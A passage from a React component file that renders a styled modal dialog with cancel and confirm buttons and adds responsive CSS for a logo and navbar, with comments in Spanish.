            borderRadius: '12px',
            maxWidth: '500px',
            width: '90%',
            boxShadow: '0 10px 25px rgba(0, 0, 0, 0.5)'
          }}>
            <h2 style={{ 
              color: modalContent.type === 'error' ? '#ff6b6b' : modalContent.type === 'success' ? '#4ecdc4' : '#fff', 
              marginTop: 0,
              fontSize: '1.5rem',
              marginBottom: '1rem'
            }}>
              {modalContent.title}
            </h2>
            <p style={{ 
              color: '#ccc', 
              fontSize: '1rem',
              lineHeight: '1.5',
              marginBottom: '2rem'
            }}>
              {modalContent.message}
            </p>
            <div style={{ 
              display: 'flex', 
              justifyContent: modalContent.showCancel ? 'space-between' : 'flex-end', 
              gap: '1rem' 
            }}>
              {modalContent.showCancel && (
                <button onClick={() => {
                  setShowModal(false)
                  modalContent.onCancel && modalContent.onCancel()
                }} style={{
                  padding: '0.75rem 1.5rem',
                  backgroundColor: 'transparent',
                  color: '#fff',
                  border: '1px solid #555',
                  borderRadius: '8px',
                  cursor: 'pointer',
                  fontSize: '1rem',
                  fontWeight: '500'
                }}>
                  Cancel
                </button>
              )}
              <button onClick={() => {
                setShowModal(false)
                modalContent.onConfirm && modalContent.onConfirm()
              }} style={{
                padding: '0.75rem 1.5rem',
                backgroundColor: modalContent.type === 'error' ? '#ff6b6b' : modalContent.type === 'success' ? '#4ecdc4' : '#0070f3',
                color: '#fff',
                border: 'none',
                borderRadius: '8px',
                cursor: 'pointer',
                fontSize: '1rem',
                fontWeight: '500'
              }}>
                {modalContent.confirmText}
              </button>
            </div>
          </div>
        </div>
      )}

       <style jsx>{`
        @keyframes spin {
          0% { transform: rotate(0deg); }
          100% { transform: rotate(360deg); }
        }
        
        /* Media query para dispositivos móviles */
        @media (max-width: 768px) {
          .responsive-logo {
            width: 20% !important; /* Más grande en móviles */
            max-width: 100px !important;
            min-width: 70px !important;
          }
        }
        
        /* Media query para dispositivos muy pequeños */
        @media (max-width: 480px) {
          .responsive-logo {
            width: 25% !important; /* Aún más grande en móviles pequeños */
            max-width: 90px !important;
            min-width: 60px !important;
          }
          
          /* Opcional: ajustar el padding del navbar en móviles */
          .navbar {
            padding: 1rem !important;
          }
        }
      `}</style>
    </div>
  )
}
